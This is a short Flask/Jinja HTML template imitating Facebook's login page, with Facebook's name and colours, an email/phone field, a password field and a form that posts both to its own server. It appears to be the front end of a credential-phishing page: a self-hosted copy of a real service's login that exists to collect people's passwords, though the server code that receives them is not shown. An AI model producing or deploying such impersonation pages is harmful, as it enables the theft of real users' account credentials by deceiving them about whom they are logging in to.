<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook Login</title>
  <style>
    body {
      background: #f0f2f5;
      font-family: Arial, sans-serif;
    }
    .container {
      width: 400px;
      margin: 100px auto;
      background: white;
      padding: 25px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
    }
    h2 { color: #1877f2; text-align: center; }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    .btn {
      background: #1877f2;
      color: white;
      padding: 10px;
      margin-top: 20px;
      border: none;
      width: 100%;
      cursor: pointer;
      border-radius: 5px;
    }
    .btn:hover { background: #145bb7; }
    .flash { color: red; font-weight: bold; text-align: center; }
    .forgot {
      text-align: right;
      font-size: 14px;
      margin-top: 5px;
    }
    .forgot a { color: #1877f2; text-decoration: none; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Facebook Login</h2>
    {% with messages = get_flashed_messages() %}
      {% if messages %}
        <div class="flash">{{ messages[0] }}</div>
      {% endif %}
    {% endwith %}

    <form method="POST">
      <input type="text" name="login_id" placeholder="Email or Phone" required>
      <input type="password" name="password" placeholder="Password" required>
      <div class="forgot"><a href="#">Forgotten password?</a></div>
      <button class="btn" type="submit">Log In</button>
    </form>
  </div>
</body>
        </html>
